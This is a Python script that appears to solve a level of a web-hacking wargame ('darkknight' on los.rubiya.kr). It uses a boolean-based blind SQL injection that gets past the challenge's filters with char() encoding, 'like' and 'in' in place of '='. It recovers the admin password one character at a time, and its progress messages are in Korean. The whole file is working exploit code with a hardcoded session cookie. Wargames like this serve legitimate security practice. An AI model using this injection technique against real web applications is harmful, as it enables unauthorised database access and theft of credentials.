from urllib.request import urlopen
import urllib
import requests

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?"
passid =  {'PHPSESSID': 'd390gv8lirld82i5opc2qapa7u'}
flag = ""

for pw_value in range(1,9):
    for ascii in range(48,128):
          value = "1 or id like char(0x61, 0x64, 0x6d, 0x69, 0x6e) and ord(mid(pw,{},1)) in ({})".format(pw_value,ascii)
          params = {'pw': '1' , 'no' : value } 
          response = requests.get(url, params=params, cookies=passid)
          if 'Hello admin' in response.text :
            flag+=chr(ascii)
            print("발견 : "+flag)
            break
         # print(response.text)
          print(pw_value,"번째 값 찾는중 : ",chr(ascii))
print("pw : ",flag)
